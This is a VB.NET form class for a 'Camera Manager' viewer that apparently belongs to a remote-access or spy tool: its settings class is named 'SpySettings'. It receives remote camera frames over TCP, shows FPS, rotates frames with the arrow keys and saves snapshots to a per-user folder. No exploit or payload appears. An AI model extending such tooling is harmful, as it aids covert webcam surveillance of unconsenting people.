Imports System.ComponentModel

Public Class CameraManager

    Public CameraClient As Net.Sockets.TcpClient

    Public classCamera As sockets.Client

    Public Client As Net.Sockets.TcpClient

    Public classClient As sockets.Client

    Public Title As String = "null"

    Private MouseState As Boolean = False

    Private FPS As Integer = 0

    Public FPSTMP As Integer = 0

    Public SizeFrame As String = "0 kb"

    Public TempImage As PictureBox = Nothing

    Public KEYsx As String = "None"

    Public tmpFolderUSER As String = ""

    Private boSave As Boolean = False

    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub CameraManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.Icon = New Icon(reso.res_Path & "\Icons\win\6.ico")

        TP.Start()

        Frames.Start()

        Me.Text = Title

        Me.TOpacity.Interval = SpySettings.T_Interval


        Me.Focus()

        Me.TOpacity.Enabled = True
    End Sub

    Private Sub CameraManager_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing

        TP.Enabled = False

        Frames.Enabled = False

        If Not classCamera Is Nothing Then

            classCamera.qit = True

            classCamera.Close(CameraClient)

        End If

    End Sub

    Private Sub TP_Tick(sender As Object, e As EventArgs) Handles TP.Tick

        If Not classCamera Is Nothing Then

            Try

                ProgressBar1.Value = classCamera.Progresr()

            Catch ex As Exception

            End Try

        End If

    End Sub

    Private Sub Frames_Tick(sender As Object, e As EventArgs) Handles Frames.Tick

        FPS = FPSTMP

        FPSTMP = 0

        SizeFrame = "0 kb"

    End Sub

    Private Sub CAM0_Click(sender As Object, e As EventArgs) Handles CAM0.Click

    End Sub

    Private Sub CAM0_MouseHover(sender As Object, e As EventArgs) Handles CAM0.MouseHover

        MouseState = True

        CAM0.Invalidate()

    End Sub

    Private Sub CAM0_MouseLeave(sender As Object, e As EventArgs) Handles CAM0.MouseLeave

        MouseState = False

        CAM0.Invalidate()

    End Sub

    Private Sub CAM0_Paint(sender As Object, e As PaintEventArgs) Handles CAM0.Paint

        If MouseState And Frames.Enabled = True Then

            Dim txt As String = String.Format("{0} fps - {1}", CStr(FPS), SizeFrame)

            Dim stringSize As New SizeF

            stringSize = e.Graphics.MeasureString(txt, reso.f)

            Dim rect As New Rectangle(5, 5, stringSize.Width, stringSize.Height)

            Dim clr As Color = SpySettings.DefaultColor_Background

            e.Graphics.FillRectangle(New Pen(Color.FromArgb(200, clr.R, clr.G, clr.B)).Brush, rect)

            e.Graphics.DrawString(txt, reso.f, New SolidBrush(SpySettings.DefaultColor_Foreground), 5, 5)

        End If

    End Sub

    Private Sub CameraManager_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        Select Case e.KeyCode
            Case Keys.Right
                KEYsx = "Right"
                e.Handled = True
            Case Keys.Left
                KEYsx = "Left"
                e.Handled = True
            Case Keys.Up
                KEYsx = "Up"
                e.Handled = True
            Case Keys.Down
                KEYsx = "Down"
                e.Handled = True
            Case Keys.S
                boSave = True
                e.Handled = True
        End Select
    End Sub

    Private Sub CameraManager_KeyUp(sender As Object, e As KeyEventArgs) Handles Me.KeyUp
        Select Case e.KeyCode
            Case Keys.S
                boSave = False
                e.Handled = True
        End Select
    End Sub
    Public Function RotateFlip(ByVal imag As Image) As Image
        Try
            TempImage.Image = imag
            If TempImage IsNot Nothing Then
                Select Case KEYsx
                    Case "Right"
                        TempImage.Image.RotateFlip(RotateFlipType.Rotate90FlipNone)
                        TempImage.Tag = "90n"
                    Case "Left"
                        TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone)
                        TempImage.Tag = "270n"
                    Case "Up"
                        TempImage.Image.RotateFlip(RotateFlipType.Rotate180FlipX)
                        TempImage.Tag = "180x"
                    Case "Down"
                        TempImage.Image.RotateFlip(RotateFlipType.Rotate180FlipY)
                        TempImage.Tag = "180y"
                End Select

                If boSave Then
                    Dim cam As String = Me.tmpFolderUSER & "\Camera Manager"
                    If Not IO.Directory.Exists(cam) Then
                        IO.Directory.CreateDirectory(cam)
                    End If
                    If IO.Directory.Exists(cam) Then
                        TempImage.Image.Save(cam & "\p_" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg", Imaging.ImageFormat.Jpeg)
                    End If
                End If

                Return TempImage.Image
            End If
        Catch ex As Exception
        End Try
        Return Nothing
    End Function

End Class